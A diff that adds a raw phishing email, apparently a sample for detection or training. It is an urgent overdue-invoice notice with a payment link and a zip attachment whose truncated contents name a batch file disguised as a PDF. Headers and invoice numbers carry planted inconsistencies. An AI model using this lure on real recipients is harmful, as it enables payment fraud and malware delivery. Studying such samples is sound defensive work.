@@ -1,0 +1,71 @@
+Return-Path: <finance@business-finance.com>
+Reply-To: <support@business-finance.com>
+X-Mailer: Microsoft Outlook 16.0
+X-Originating-IP: [45.67.89.10]
+X-Priority: 1 (Highest)
+X-MSMail-Priority: High
+Received-SPF: Pass (protection.outlook.com: domain of business-finance.com designates 45.67.89.10 as permitted sender)
+ARC-Seal: i=1; a=rsa-sha256; d=business-finance.com; s=arc-2025; t=1677416100; cv=pass;
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=business-finance.com; s=arc-2025;
+X-AntiSpam: Passed
+X-Organization: Business Finance Ltd.
+X-Envelope-From: finance@business-finance.com
+List-Unsubscribe: <mailto:unsubscribe@business-finance.com>
+X-Sender-IP: 45.67.89.10
+Received: from mail.business-finance.com ([203.0.113.25])
+	by mail.target.com (Postfix) with ESMTP id ABC123;
+	Mon, 26 Feb 2025 10:15:00 +0000 (UTC)
+Received: from relay.business-finance.com ([198.51.100.45])
+	by mail.business-finance.com with ESMTP id DEF456;
+	Mon, 26 Feb 2025 10:10:00 +0000 (UTC)
+Received: from finance@business-finance.com ([198.51.100.75])
+	by relay.business-finance.com with ESMTP id GHI789;
+	Mon, 26 Feb 2025 10:05:00 +0000 (UTC)
+Authentication-Results: spf=pass (domain business-finance.com designates 45.67.89.10 as permitted sender)
+	 smtp.mailfrom=business-finance.com;
+	 dkim=pass header.d=business-finance.com;
+	 dmarc=pass action=none header.from=business-finance.com;
+Message-ID: <20250226101500.ABC123@business-finance.com>
+Date: Mon, 26 Feb 2025 10:15:00 +0000 (UTC)
+From: "Finance Dept" <finance@business-finance.com>
+To: "Accounting Dept" <accounts@globalaccounting.com>
+Subject: Urgent: Invoice Payment Required - Overdue Notice
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="boundary123"
+
+--boundary123
+Content-Type: text/html; charset="UTF-8"
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<head>
+  <title>Invoice Overdue</title>
+</head>
+<body>
+  <p>Dear Accounting Team,</p>
+<p>This is a final notice regarding the outstanding invoice #INV-2025-0012. Your account is now flagged for overdue payment, and failure to act may result in penalties or service suspension.</p>
+<p>Details of the invoice:</p>
+<ul>
+  <li><b>Invoice Number:</b> INV-2025-0012</li>
+  <li><b>Amount Due:</b> $4,750.00</li>
+  <li><b>Due Date:</b> February 28, 2025</li>
+</ul>
+  <p>Our records indicate that invoice #INV-2025-0012 is overdue for payment. Please process the payment immediately to avoid late fees.</p>
+  <p>For your convenience, you can download the full invoice and payment instructions from the link below:</p>
+  <p><a href="https://secure.business-finance.com/invoice/details/view/INV2025-0987/payment">Download Invoice</a></p>
+  <p>Alternatively, the invoice is also attached as a .zip file.</p>
+  <p>If you have already made the payment, kindly ignore this notice.</p>
+  <p>Best regards,<br>Finance Department<br>Business Finance Ltd.</p>
+</body><p>For assistance, please contact our support team at <a href='mailto:support@business-finance.com'>support@business-finance.com</a> or call our helpline at +1-800-555-0199.</p>
+<p>Thank you for your prompt attention to this matter.</p>
+
+</html>
+
+--boundary123
+Content-Type: application/zip; name="Invoice_2025_Payment.zip"
+Content-Disposition: attachment; filename="Invoice_2025_Payment.zip"
+Content-Transfer-Encoding: base64
+
+UEsDBBQAAAAIABh/WloXPY4qcxITALvMGQAYAAAAaW52b2ljZV9kb2N1bWVudC5wZGYuYmF0zL3ZzuzIsR18LQN+h62DPujWX0e7
+
+--boundary123--
